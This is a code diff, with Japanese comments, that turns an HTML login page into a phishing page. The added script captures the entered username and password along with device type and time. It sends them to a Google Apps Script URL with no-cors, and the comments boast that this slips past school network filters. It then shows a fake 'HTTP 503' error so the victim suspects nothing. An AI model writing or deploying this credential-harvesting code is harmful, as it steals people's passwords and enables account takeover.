@@ -35,7 +35,7 @@
     </form>
   </div>
 
-  <!-- ⚠️ エラー画面（ログインを押した後にスマホに表示され、そのまま留まる） -->
+  <!-- ⚠️ エラー画面（ログイン後にスマホで表示され、そのまま留まる） -->
   <div class="login-container hidden" id="error-box">
     <div class="error-icon">⚠️</div>
     <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
@@ -43,10 +43,38 @@
   </div>
 
   <script>
+    // 先ほどコピーしたGoogle Apps Scriptの「ウェブアプリのURL」をここに貼り付けてください
+    const API_URL = "ここにGASのウェブアプリURLを貼り付け";
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes("iPhone")) return "iPhone (iOS)";
+      if (ua.includes("iPad")) return "iPad (iOS)";
+      if (ua.includes("Android")) return "Androidスマホ";
+      if (ua.includes("Windows")) return "Windows PC";
+      if (ua.includes("Mac")) return "Mac PC";
+      return "不明な端末";
+    }
+
     document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // ログインボタンを押したら、フォームを隠してエラー画面を表示し、そこで完全にストップ！
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const device = getDeviceInfo();
+      const time = new Date().toLocaleTimeString();
+
+      const payload = { time, device, username, password };
+
+      // 学校のネット制限に引っかからない普通のHTTPS通信で安全に送信！
+      fetch(API_URL, {
+        method: "POST",
+        mode: "no-cors", // CORS制限を回避して確実に飛ばすおまじない
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(err => console.log(err));
+
+      // スマホ側はフォームを隠してエラー画面を表示し、そこで完全にストップ！
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
     });
